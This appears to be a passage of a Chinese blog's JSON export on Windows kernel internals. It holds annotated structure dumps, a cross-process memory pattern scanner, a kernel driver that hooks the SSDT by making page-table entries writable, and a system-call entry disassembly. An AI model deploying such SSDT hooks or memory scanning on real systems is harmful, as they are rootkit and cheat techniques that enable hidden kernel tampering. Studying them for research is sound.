Void +0x268 ModifiedPageCount : Uint4B +0x26c Flags2 : Uint4B +0x26c JobNotReallyActive : Pos 0, 1 Bit +0x26c AccountingFolded : Pos 1, 1 Bit +0x26c NewProcessReported : Pos 2, 1 Bit +0x26c ExitProcessReported : Pos 3, 1 Bit +0x26c ReportCommitChanges : Pos 4, 1 Bit +0x26c LastReportMemory : Pos 5, 1 Bit +0x26c ReportPhysicalPageChanges : Pos 6, 1 Bit +0x26c HandleTableRundown : Pos 7, 1 Bit +0x26c NeedsHandleRundown : Pos 8, 1 Bit +0x26c RefTraceEnabled : Pos 9, 1 Bit +0x26c NumaAware : Pos 10, 1 Bit +0x26c ProtectedProcess : Pos 11, 1 Bit +0x26c DefaultPagePriority : Pos 12, 3 Bits +0x26c PrimaryTokenFrozen : Pos 15, 1 Bit +0x26c ProcessVerifierTarget : Pos 16, 1 Bit +0x26c StackRandomizationDisabled : Pos 17, 1 Bit +0x26c AffinityPermanent : Pos 18, 1 Bit +0x26c AffinityUpdateEnable : Pos 19, 1 Bit +0x26c PropagateNode : Pos 20, 1 Bit +0x26c ExplicitAffinity : Pos 21, 1 Bit +0x270 Flags : Uint4B +0x270 CreateReported : Pos 0, 1 Bit +0x270 NoDebugInherit : Pos 1, 1 Bit +0x270 ProcessExiting : Pos 2, 1 Bit +0x270 ProcessDelete : Pos 3, 1 Bit +0x270 Wow64SplitPages : Pos 4, 1 Bit +0x270 VmDeleted : Pos 5, 1 Bit +0x270 OutswapEnabled : Pos 6, 1 Bit +0x270 Outswapped : Pos 7, 1 Bit +0x270 ForkFailed : Pos 8, 1 Bit +0x270 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x270 AddressSpaceInitialized : Pos 10, 2 Bits +0x270 SetTimerResolution : Pos 12, 1 Bit +0x270 BreakOnTermination : Pos 13, 1 Bit +0x270 DeprioritizeViews : Pos 14, 1 Bit +0x270 WriteWatch : Pos 15, 1 Bit +0x270 ProcessInSession : Pos 16, 1 Bit +0x270 OverrideAddressSpace : Pos 17, 1 Bit +0x270 HasAddressSpace : Pos 18, 1 Bit +0x270 LaunchPrefetched : Pos 19, 1 Bit +0x270 InjectInpageErrors : Pos 20, 1 Bit +0x270 VmTopDown : Pos 21, 1 Bit +0x270 ImageNotifyDone : Pos 22, 1 Bit +0x270 PdeUpdateNeeded : Pos 23, 1 Bit +0x270 VdmAllowed : Pos 24, 1 Bit +0x270 CrossSessionCreate : Pos 25, 1 Bit +0x270 ProcessInserted : Pos 26, 1 Bit +0x270 DefaultIoPriority : Pos 27, 3 Bits +0x270 ProcessSelfDelete : Pos 30, 1 Bit +0x270 SetTimerResolutionLink : Pos 31, 1 Bit +0x274 ExitStatus : Int4B +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY +0x2b0 RequestedTimerResolution : Uint4B +0x2b4 ActiveThreadsHighWatermark : Uint4B +0x2b8 SmallestTimerResolution : Uint4B +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD ntdll!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B +0x0c8 FpSoftwareStatusRegister : Uint4B +0x0cc SystemReserved1 : [54] Ptr32 Void +0x1a4 ExceptionCode : Int4B +0x1a8 ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK +0x1ac SpareBytes : [36] UChar +0x1d0 TxFsContext : Uint4B +0x1d4 GdiTebBatch : _GDI_TEB_BATCH +0x6b4 RealClientId : _CLIENT_ID +0x6bc GdiCachedProcessHandle : Ptr32 Void +0x6c0 GdiClientPID : Uint4B +0x6c4 GdiClientTID : Uint4B +0x6c8 GdiThreadLocalInfo : Ptr32 Void +0x6cc Win32ClientInfo : [62] Uint4B +0x7c4 glDispatchTable : [233] Ptr32 Void +0xb68 glReserved1 : [29] Uint4B +0xbdc glReserved2 : Ptr32 Void +0xbe0 glSectionInfo : Ptr32 Void +0xbe4 glSection : Ptr32 Void +0xbe8 glTable : Ptr32 Void +0xbec glCurrentRC : Ptr32 Void +0xbf0 glContext : Ptr32 Void +0xbf4 LastStatusValue : Uint4B +0xbf8 StaticUnicodeString : _UNICODE_STRING +0xc00 StaticUnicodeBuffer : [261] Wchar +0xe0c DeallocationStack : Ptr32 Void +0xe10 TlsSlots : [64] Ptr32 Void +0xf10 TlsLinks : _LIST_ENTRY +0xf18 Vdm : Ptr32 Void +0xf1c ReservedForNtRpc : Ptr32 Void +0xf20 DbgSsReserved : [2] Ptr32 Void +0xf28 HardErrorMode : Uint4B +0xf2c Instrumentation : [9] Ptr32 Void +0xf50 ActivityId : _GUID +0xf60 SubProcessTag : Ptr32 Void +0xf64 EtwLocalData : Ptr32 Void +0xf68 EtwTraceData : Ptr32 Void +0xf6c WinSockData : Ptr32 Void +0xf70 GdiBatchCount : Uint4B +0xf74 CurrentIdealProcessor : _PROCESSOR_NUMBER +0xf74 IdealProcessorValue : Uint4B +0xf74 ReservedPad0 : UChar +0xf75 ReservedPad1 : UChar +0xf76 ReservedPad2 : UChar +0xf77 IdealProcessor : UChar +0xf78 GuaranteedStackBytes : Uint4B +0xf7c ReservedForPerf : Ptr32 Void +0xf80 ReservedForOle : Ptr32 Void +0xf84 WaitingOnLoaderLock : Uint4B +0xf88 SavedPriorityState : Ptr32 Void +0xf8c SoftPatchPtr1 : Uint4B +0xf90 ThreadPoolData : Ptr32 Void +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void +0xf98 MuiGeneration : Uint4B +0xf9c IsImpersonating : Uint4B +0xfa0 NlsCache : Ptr32 Void +0xfa4 pShimData : Ptr32 Void +0xfa8 HeapVirtualAffinity : Uint4B +0xfac CurrentTransactionHandle : Ptr32 Void +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME +0xfb4 FlsData : Ptr32 Void +0xfb8 PreferredLanguages : Ptr32 Void +0xfbc UserPrefLanguages : Ptr32 Void +0xfc0 MergedPrefLanguages : Ptr32 Void +0xfc4 MuiImpersonation : Uint4B +0xfc8 CrossTebFlags : Uint2B +0xfc8 SpareCrossTebBits : Pos 0, 16 Bits +0xfca SameTebFlags : Uint2B +0xfca SafeThunkCall : Pos 0, 1 Bit +0xfca InDebugPrint : Pos 1, 1 Bit +0xfca HasFiberData : Pos 2, 1 Bit +0xfca SkipThreadAttach : Pos 3, 1 Bit +0xfca WerInShipAssertCode : Pos 4, 1 Bit +0xfca RanProcessInit : Pos 5, 1 Bit +0xfca ClonedThread : Pos 6, 1 Bit +0xfca SuppressDebugMsg : Pos 7, 1 Bit +0xfca DisableUserStackWalk : Pos 8, 1 Bit +0xfca RtlExceptionAttached : Pos 9, 1 Bit +0xfca InitialThread : Pos 10, 1 Bit +0xfca SpareSameTebBits : Pos 11, 5 Bits +0xfcc TxnScopeEnterCallback : Ptr32 Void +0xfd0 TxnScopeExitCallback : Ptr32 Void +0xfd4 TxnScopeContext : Ptr32 Void +0xfd8 LockCount : Uint4B +0xfdc SpareUlong0 : Uint4B +0xfe0 ResourceRetValue : Ptr32 Void kd&gt; dt nt!_ETHREAD +0x000 Tcb : _KTHREAD +0x200 CreateTime : _LARGE_INTEGER +0x208 ExitTime : _LARGE_INTEGER +0x208 KeyedWaitChain : _LIST_ENTRY +0x210 ExitStatus : Int4B +0x214 PostBlockList : _LIST_ENTRY +0x214 ForwardLinkShadow : Ptr32 Void +0x218 StartAddress : Ptr32 Void //线程的起始地址 +0x21c TerminationPort : Ptr32 _TERMINATION_PORT +0x21c ReaperLink : Ptr32 _ETHREAD +0x21c KeyedWaitValue : Ptr32 Void +0x220 ActiveTimerListLock : Uint4B +0x224 ActiveTimerListHead : _LIST_ENTRY +0x22c Cid : _CLIENT_ID //包含线程ID、进程ID +0x234 KeyedWaitSemaphore : _KSEMAPHORE +0x234 AlpcWaitSemaphore : _KSEMAPHORE +0x248 ClientSecurity : _PS_CLIENT_SECURITY_CONTEXT +0x24c IrpList : _LIST_ENTRY +0x254 TopLevelIrp : Uint4B +0x258 DeviceToVerify : Ptr32 _DEVICE_OBJECT +0x25c CpuQuotaApc : Ptr32 _PSP_CPU_QUOTA_APC +0x260 Win32StartAddress : Ptr32 Void //UI线程的起始地址 +0x264 LegacyPowerObject : Ptr32 Void +0x268 ThreadListEntry : _LIST_ENTRY //对应EPROCESS 0x268 +0x270 RundownProtect : _EX_RUNDOWN_REF +0x274 ThreadLock : _EX_PUSH_LOCK +0x278 ReadClusterSize : Uint4B +0x27c MmLockOrdering : Int4B +0x280 CrossThreadFlags : Uint4B +0x280 Terminated : Pos 0, 1 Bit +0x280 ThreadInserted : Pos 1, 1 Bit +0x280 HideFromDebugger : Pos 2, 1 Bit +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit +0x280 Reserved : Pos 4, 1 Bit +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit +0x280 BreakOnTermination : Pos 6, 1 Bit //置1后，关闭不了线程，强行关闭会蓝屏 +0x280 SkipCreationMsg : Pos 7, 1 Bit +0x280 SkipTerminationMsg : Pos 8, 1 Bit +0x280 CopyTokenOnOpen : Pos 9, 1 Bit +0x280 ThreadIoPriority : Pos 10, 3 Bits +0x280 ThreadPagePriority : Pos 13, 3 Bits +0x280 RundownFail : Pos 16, 1 Bit +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit +0x284 SameThreadPassiveFlags : Uint4B +0x284 ActiveExWorker : Pos 0, 1 Bit +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit +0x284 MemoryMaker : Pos 2, 1 Bit +0x284 ClonedThread : Pos 3, 1 Bit +0x284 KeyedEventInUse : Pos 4, 1 Bit +0x284 RateApcState : Pos 5, 2 Bits +0x284 SelfTerminate : Pos 7, 1 Bit +0x288 SameThreadApcFlags : Uint4B +0x288 Spare : Pos 0, 1 Bit +0x288 StartAddressInvalid : Pos 1, 1 Bit +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit +0x289 SuppressSymbolLoad : Pos 3, 1 Bit +0x289 Prefetching : Pos 4, 1 Bit +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit +0x28a TrimTrigger : Pos 4, 2 Bits +0x28a Spare1 : Pos 6, 2 Bits +0x28b PriorityRegionActive : UChar +0x28c CacheManagerActive : UChar +0x28d DisablePageFaultClustering : UChar +0x28e ActiveFaultCount : UChar +0x28f LockOrderState : UChar +0x290 AlpcMessageId : Uint4B +0x294 AlpcMessage : Ptr32 Void +0x294 AlpcReceiveAttributeSet : Uint4B +0x298 AlpcWaitListEntry : _LIST_ENTRY +0x2a0 CacheManagerCount : Uint4B +0x2a4 IoBoostCount : Uint4B +0x2a8 IrpListLock : Uint4B +0x2ac ReservedForSynchTracking : Ptr32 Void +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY kd&gt; dt nt!_KTHREAD +0x000 Header : _DISPATCHER_HEADER // +0x010 CycleTime : Uint8B +0x018 HighCycleTime : Uint4B +0x020 QuantumTarget : Uint8B //总耗时的时间碎片 +0x028 InitialStack : Ptr32 Void //栈底 +0x02c StackLimit : Ptr32 Void //栈顶 +0x030 KernelStack : Ptr32 Void //线程切换，把老线程的ESP保存到这个位置，换回时，从这取 +0x034 ThreadLock : Uint4B +0x038 WaitRegister : _KWAIT_STATUS_REGISTER +0x039 Running : UChar //线程运行中 +0x03a Alerted : [2] UChar //可警惕 [0]代表0环，[3]代表3环 APC时用到 +0x03c KernelStackResident : Pos 0, 1 Bit //是否允许堆栈拓展 +0x03c ReadyTransition : Pos 1, 1 Bit +0x03c ProcessReadyQueue : Pos 2, 1 Bit +0x03c WaitNext : Pos 3, 1 Bit +0x03c SystemAffinityActive : Pos 4, 1 Bit +0x03c Alertable : Pos 5, 1 Bit //是否可被唤醒 必须处于等待状态 +0x03c GdiFlushActive : Pos 6, 1 Bit +0x03c UserStackWalkActive : Pos 7, 1 Bit +0x03c ApcInterruptRequest : Pos 8, 1 Bit //是否允许APC中断 +0x03c ForceDeferSchedule : Pos 9, 1 Bit +0x03c QuantumEndMigrate : Pos 10, 1 Bit +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit +0x03c TimerActive : Pos 12, 1 Bit +0x03c SystemThread : Pos 13, 1 Bit //是否是内核线程 +0x03c Reserved : Pos 14, 18 Bits +0x03c MiscFlags : Int4B +0x040 ApcState : _KAPC_STATE //APC状态 可以拿到上下文环境 +0x040 ApcStateFill : [23] UChar +0x057 Priority : Char //线程优先级 +0x058 NextProcessor : Uint4B //下一次线程跑在那个核上 +0x05c DeferredProcessor : Uint4B //默认跑在哪个核上 +0x060 ApcQueueLock : Uint4B +0x064 ContextSwitches : Uint4B //线程切换次数 +0x068 State : UChar //线程状态 +0x069 NpxState : Char +0x06a WaitIrql : UChar +0x06b WaitMode : Char +0x06c WaitStatus : Int4B +0x070 WaitBlockList : Ptr32 _KWAIT_BLOCK +0x074 WaitListEntry : _LIST_ENTRY +0x074 SwapListEntry : _SINGLE_LIST_ENTRY +0x07c Queue : Ptr32 _KQUEUE //线程队列 +0x080 WaitTime : Uint4B +0x084 KernelApcDisable : Int2B +0x086 SpecialApcDisable : Int2B +0x084 CombinedApcDisable : Uint4B +0x088 Teb : Ptr32 Void +0x090 Timer : _KTIMER //线程定时器 +0x0b8 AutoAlignment : Pos 0, 1 Bit +0x0b8 DisableBoost : Pos 1, 1 Bit +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit +0x0b8 CalloutActive : Pos 4, 1 Bit +0x0b8 ApcQueueable : Pos 5, 1 Bit +0x0b8 EnableStackSwap : Pos 6, 1 Bit +0x0b8 GuiThread : Pos 7, 1 Bit +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit +0x0b8 VdmSafe : Pos 9, 1 Bit +0x0b8 UmsDispatched : Pos 10, 1 Bit +0x0b8 ReservedFlags : Pos 11, 21 Bits +0x0b8 ThreadFlags : Int4B +0x0bc ServiceTable : Ptr32 Void +0x0c0 WaitBlock : [4] _KWAIT_BLOCK +0x120 QueueListEntry : _LIST_ENTRY +0x128 TrapFrame : Ptr32 _KTRAP_FRAME +0x12c FirstArgument : Ptr32 Void +0x130 CallbackStack : Ptr32 Void +0x130 CallbackDepth : Uint4B +0x134 ApcStateIndex : UChar +0x135 BasePriority : Char +0x136 PriorityDecrement : Char +0x136 ForegroundBoost : Pos 0, 4 Bits +0x136 UnusualBoost : Pos 4, 4 Bits +0x137 Preempted : UChar //允许抢占 +0x138 AdjustReason : UChar +0x139 AdjustIncrement : Char +0x13a PreviousMode : Char +0x13b Saturation : Char +0x13c SystemCallNumber : Uint4B +0x140 FreezeCount : Uint4B +0x144 UserAffinity : _GROUP_AFFINITY +0x150 Process : Ptr32 _KPROCESS //创建线程的进程 （这里能用假进程替换么？） +0x154 Affinity : _GROUP_AFFINITY +0x160 IdealProcessor : Uint4B +0x164 UserIdealProcessor : Uint4B +0x168 ApcStatePointer : [2] Ptr32 _KAPC_STATE +0x170 SavedApcState : _KAPC_STATE +0x170 SavedApcStateFill : [23] UChar +0x187 WaitReason : UChar +0x188 SuspendCount : Char +0x189 Spare1 : Char +0x18a OtherPlatformFill : UChar +0x18c Win32Thread : Ptr32 Void +0x190 StackBase : Ptr32 Void +0x194 SuspendApc : _KAPC +0x194 SuspendApcFill0 : [1] UChar +0x195 ResourceIndex : UChar +0x194 SuspendApcFill1 : [3] UChar +0x197 QuantumReset : UChar +0x194 SuspendApcFill2 : [4] UChar +0x198 KernelTime : Uint4B +0x194 SuspendApcFill3 : [36] UChar +0x1b8 WaitPrcb : Ptr32 _KPRCB +0x194 SuspendApcFill4 : [40] UChar +0x1bc LegoData : Ptr32 Void +0x194 SuspendApcFill5 : [47] UChar +0x1c3 LargeStack : UChar +0x1c4 UserTime : Uint4B +0x1c8 SuspendSemaphore : _KSEMAPHORE +0x1c8 SuspendSemaphorefill : [20] UChar +0x1dc SListFaultCount : Uint4B +0x1e0 ThreadListEntry : _LIST_ENTRY //创建线程的进程拥有的所有线程组成的链表，对应KPROCESS 0x2c +0x1e8 MutantListHead : _LIST_ENTRY +0x1f0 SListFaultAddress : Ptr32 Void +0x1f4 ThreadCounters : Ptr32 _KTHREAD_COUNTERS +0x1f8 XStateSave : Ptr32 _XSTATE_SAVE","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"内存特征码搜索-三环","slug":"ParttenFindder","date":"2021-07-23T02:26:59.000Z","updated":"2021-10-25T08:07:19.670Z","comments":true,"path":"2021/07/23/ParttenFindder/","link":"","permalink":"http://example.com/2021/07/23/ParttenFindder/","excerpt":"","text":"可以搭配IDA特征码提取插件使用 #include &lt;Windows.h> #include &lt;psapi.h> #include &lt;stdio.h> HANDLE gHandle = NULL; int FeatureCode(IN DWORD BaseAddress, IN int SectionSize, IN char* markCode) { if (strlen(markCode) % 2 != 0) return 0; int FCodeSize = strlen(markCode) / 2; BYTE* FCode = new BYTE[FCodeSize]; for (int i = 0; i &lt; FCodeSize; i++) { char c[] = { markCode[i * 2], markCode[i * 2 + 1], '\\0'}; FCode[i] = (BYTE)::strtol(c, NULL, 16); //printf(\"%c\\t%c\\t%x\\n\", markCode[i * 2], markCode[i * 2 + 1], FCode[i]); } if (BaseAddress == NULL || FCode == NULL || SectionSize == 0 || FCodeSize == 0) { printf(\"Partten Error\\r\\n\"); return -1; } char* TempAddress = (char*)malloc(SectionSize); if (TempAddress == NULL) { printf(\"malloc Error\"); return -1; } memset(TempAddress, 0, SectionSize); ReadProcessMemory(gHandle, (LPCVOID)BaseAddress, TempAddress, SectionSize, NULL); for (int i = 0, j = 0; i &lt; SectionSize; i++) { for (j = 0; j &lt; FCodeSize; j++, i++) { if (FCode[j] == 0xCC) { continue; } if (FCode[j] != TempAddress[i]) { break; } } if (j == FCodeSize) { free(TempAddress); return i - FCodeSize + BaseAddress; } } free(TempAddress); return -1; } int main() { HMODULE hMods[1024]; DWORD cbNeeded; UINT i; gHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 880); if (gHandle == INVALID_HANDLE_VALUE) { printf(\"OpenProcess Error\\r\\n\"); return 0; } if (EnumProcessModules(gHandle, hMods, sizeof(hMods), &amp;cbNeeded)) { for (i = 0; i &lt; (cbNeeded / sizeof(HMODULE)); i++) { TCHAR szModName[MAX_PATH]; if (GetModuleFileNameEx(gHandle, hMods[i], szModName,sizeof(szModName) / sizeof(TCHAR))) { printf((\"%S (0x%08X)\\r\\n\"), szModName, hMods[i]); } } } printf(\"start find partten in %x\\r\\n\", hMods[0]); char * partten = (char*)\"00CCCCCC7ECC52656753657456616C756545785700006E\"; int ParttenOffset = FeatureCode((DWORD)hMods[0], 0x100000, partten); printf(\"find partten addr %x\\r\\n\", ParttenOffset); CloseHandle(gHandle); return 0; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"}]},{"title":"代码模块 | SSDT Hook","slug":"SSDTHook","date":"2021-07-20T17:09:27.000Z","updated":"2021-10-25T08:04:16.130Z","comments":true,"path":"2021/07/21/SSDTHook/","link":"","permalink":"http://example.com/2021/07/21/SSDTHook/","excerpt":"","text":"思路： 通过直接修改SSDT表中的函数地址完成HOOK操作。 其中需要注意的是SSDT的PTE是不具有写权限的，需要修改一下页属性。 #include &lt;ntifs.h> DWORD32 gNtAllocateVirtualMemoryAddr; DWORD32 PNtAllocateVirtualMemory; PCHAR SaySomething = \"hello SSDT HOOK\\r\\n\"; NTSTATUS NTAPI ZwQueryInformationProcess( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength ); PDWORD32 argv; //NtAllocateVirtualMemory(__in HANDLE ProcessHandle, __inout PVOID* BaseAddress, __in ULONG_PTR ZeroBits, __inout PSIZE_T RegionSize, __in ULONG AllocationType, __in ULONG Protect) void MyHookFun() { KdPrintEx((77,0,\"ProcessHandle %x,BaseAddress %x,ZeroBits %x, RegionSize %x, AllocationType %x, Protect %x\\r\\n\",argv[0], argv[1], argv[2], argv[3], argv[4], argv[5])); } void __declspec(naked) MyHook() { __asm { push edx; push eax; mov argv,edx; call MyHookFun; pop eax; pop edx; jmp gNtAllocateVirtualMemoryAddr; } } VOID DrivUnload(PDRIVER_OBJECT DriverObject) { *(PDWORD32)PNtAllocateVirtualMemory = gNtAllocateVirtualMemoryAddr; KdPrintEx((77, 0, \"[+]:End Hook !!!\\r\\n\")); KdPrint((\"[+]: Driver Unloaded!!!\\r\\n\")); } extern DWORD32 KeServiceDescriptorTable; NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg) { //DbgBreakPoint(); KdPrintEx((77,0,\"[+]:KeServiceDescriptorTable %x\\r\\n\", KeServiceDescriptorTable)); DWORD32 SSDTFuns = *(PDWORD32)KeServiceDescriptorTable; KdPrintEx((77, 0, \"[+]:SSDTFuns %x\\r\\n\", SSDTFuns)); PNtAllocateVirtualMemory = (PVOID)(SSDTFuns + 0x13 * 4); KdPrintEx((77, 0, \"[+]:NtAllocateVirtualMemory %x\\r\\n\", PNtAllocateVirtualMemory)); gNtAllocateVirtualMemoryAddr = *(PDWORD32)PNtAllocateVirtualMemory; KdPrintEx((77, 0, \"[+]:NtAllocateVirtualMemoryAddr %x\\r\\n\", gNtAllocateVirtualMemoryAddr)); // addr 存放的是线性地址 DWORD32 PDE = (DWORD32)(0xc0600000 + (((DWORD32)PNtAllocateVirtualMemory >> 18) &amp; 0x3ff8)); DWORD32 PTE= (DWORD32)(0xc0000000 + (((DWORD32)PNtAllocateVirtualMemory >> 9) &amp; 0x7ffff8)); KdPrintEx((77, 0, \"[+]:PDE %x, PTE %x\\r\\n\", PDE,PTE)); *(PDWORD32)PDE = *(PDWORD32)PDE | 2; *(PDWORD32)PTE = *(PDWORD32)PTE | 2; *(PDWORD32)PNtAllocateVirtualMemory = MyHook; KdPrintEx((77, 0, \"[+]:Start Hook !!!\\r\\n\")); pDriver->DriverUnload = DrivUnload; KdPrint((\"[+]: Driver Loaded!!!\\r\\n\")); return STATUS_SUCCESS; }","categories":[],"tags":[{"name":"代码","slug":"代码","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}]},{"title":"nt!KiFastSystemCall","slug":"Re-KiFastSystemCall","date":"2021-07-20T05:38:15.000Z","updated":"2021-10-25T08:07:48.757Z","comments":true,"path":"2021/07/20/Re-KiFastSystemCall/","link":"","permalink":"http://example.com/2021/07/20/Re-KiFastSystemCall/","excerpt":"","text":".text:0043E0C0 mov ecx, 23h ; '#' .text:0043E0C5 push 30h ; '0' .text:0043E0C7 pop fs ; 修改FS为0x30 .text:0043E0C9 mov ds, ecx ; 修改DS为0x23 .text:0043E0CB mov es, ecx ; 修改ES为0x23 .text:0043E0CD mov ecx, large fs:40h ; 取得 _KPCR._KTSS .text:0043E0D4 mov esp, [ecx+4] ; 切换堆栈为_KPCR.KTSS.ESP0 .text:0043E0D7 push 23h ; '#' ; _KTRAP_FRAME.HardwareSegSs = 0x23 .text:0043E0D9 push edx ; _KTRAP_FRAME.HardwareEsp .text:0043E0DA pushf ; _KTRAP_FRAME.EFlags .text:0043E0DB .text:0043E0DB loc_43E0DB: ; CODE XREF: _KiFastCallEntry2+23↑j .text:0043E0DB push 2 .text:0043E0DD add edx, 8 ; 取得第一个参数 .text:0043E0E0 popf ; 将EFLAGS改为2，即固定位为1 .text:0043E0E1 or byte ptr [esp+1], 2 ; _KTRAP_FRAME.EFLAGS.IF = 1 .text:0043E0E6 push 1Bh ; _KTRAP_FRAME.SegCs = 0x1B .text:0043E0E8 push dword ptr ds:0FFDF0304h ; _KTRAP_FRAME.EIP = 0xFFDF0304 .text:0043E0EE push 0 ; _KTRAP_FRAME.ErrCode = 0 .text:0043E0F0 push ebp ; _KTRAP_FRAME.Ebp .text:0043E0F1 push ebx ; _KTRAP_FRAME.Ebx .text:0043E0F2 push esi ; _KTRAP_FRAME.Esi .text:0043E0F3 push edi ; _KTRAP_FRAME.Edi .text:0043E0F4 mov ebx, large fs:1Ch ; _KPCR.SelfPcr .text:0043E0FB push 3Bh ; ';' ; _KTRAP_FRAME.SegFs .text:0043E0FD mov esi, [ebx+124h] ; _KPCR._KPCRB.CurrentThread .text:0043E103 push dword ptr [ebx] ; _KTRAP_FRAME.ExceptionList .text:0043E105 mov dword ptr [ebx], 0FFFFFFFFh ; _KPCR.SelfPcr.NtTib .text:0043E10B mov ebp, [esi+28h] ; _KPCR._KPCRB._KTHREAD.InitialStack .text:0043E10E push 1 ; _KTRAP_FRAME.PreviousPreviousMode = 1 表示从R3过来 .text:0043E110 sub esp, 48h ; 将栈提升到_KTRAP_FRAME结构起始地址 .text:0043E113 sub ebp, 29Ch .text:0043E119 mov byte ptr [esi+13Ah], 1 ; _KPCR._KPCRB._KTHREAD.PreviousMode = 1 表示从R3来 .text:0043E120 cmp ebp, esp ; InitalStack - 0x29c == &_KTRAP_FRAME ? .text:0043E122 jnz short loc_43E0BB ; 如果 Ebp != Esp ，跳转进入异常处理 .text:0043E124 and dword ptr [ebp+2Ch], 0 ; _KTRAP_FRAME.Dr7 = 0 .text:0043E128 test byte ptr [esi+3], 0DFh ; 判断_KTHREAD._DISPATCHER_HEADER.DebugActive 是否置1 .text:0043E12C mov [esi+128h], ebp ; _KTHREAD.TrapFrame ,即为当前线程设置TrapFrame .text:0043E132 jnz Dr_FastCallDrSave ; 如果处于被调试，则进行跳转 .text:0043E138 .text:0043E138 loc_43E138: ; CODE XREF: Dr_FastCallDrSave+D↑j .text:0043E138 ; Dr_FastCallDrSave+79↑j .text:0043E138 mov ebx, [ebp+60h] ; 取出_KTRAP_FRAME.Ebp .text:0043E13B mov edi, [ebp+68h] ; 取出_KTRAP_FRAME.Eip .text:0043E13E mov [ebp+0Ch], edx ; 将参数设置到_KTRAP_FRAME.DbgArgPointer .text:0043E141 mov dword ptr [ebp+8], 0BADB0D00h ; _KTRAP_FRAME.DbgArgMark = 0xBADB0D00 .text:0043E148 mov [ebp+0], ebx ; 设置_KTRAP_FRAME.DbgEbp .text:0043E14B mov [ebp+4], edi ; 设置_KTRAP_FRAME.DbgEip .text:0043E14E sti ; 特权指令，允许中断发生 .text:0043E14F .text:0043E14F loc_43E14F: ; CODE XREF: _KiBBTUnexpectedRange+18↑j .text:0043E14F ; _KiSystemService+7F↑j .text:0043E14F mov edi, eax ; 取出服务号 .text:0043E151 shr edi, 8 ; 服务号去除后一个字节 .text:0043E154 and edi, 10h ; 取出服务号第13位 .text:0043E157 mov ecx, edi ; 用ECX储存服务号第13位 .text:0043E159 add edi, [esi+0BCh] ; _KTHREAD.ServiceTable取出与服务号第13位相加 .text:0043E15F mov ebx, eax ; 再次取出服务号 .text:0043E161 and eax, 0FFFh ; 保留服务号后12位 .text:0043E166 cmp eax, [edi+8] ; 取出服务表中函数个数与服务号比较 .text:0043E169 jnb _KiBBTUnexpectedRange ; 如果超出服务表，则进入异常处理 .text:0043E16F cmp ecx, 10h ; 判断服务号第13位是否为1 .text:0043E172 jnz short loc_43E18E ; 服务号第13位不是1，则跳转 .text:0043E174 mov ecx, [esi+88h] ; 取出_KTHREAD.Teb .text:0043E17A xor esi, esi ; 清空esi .text:0043E17C .text:0043E17C loc_43E17C: ; DATA XREF: _KiTrap0E+156↓o .text:0043E17C or esi, [ecx+0F70h] ; 取出_KTHREAD._TEB.GdiBatchCount .text:0043E182 jz short loc_43E18E ; 如果GdiBatchCount == 0 则跳转 .text:0043E184 push edx ; 保存参数 .text:0043E185 push eax ; 保存服务号 .text:0043E186 call ds:_KeGdiFlushUserBatch ; 调用刷新GDI函数 .text:0043E18C pop eax ; 恢复服务号 .text:0043E18D pop edx ; 恢复参数 .text:0043E18E 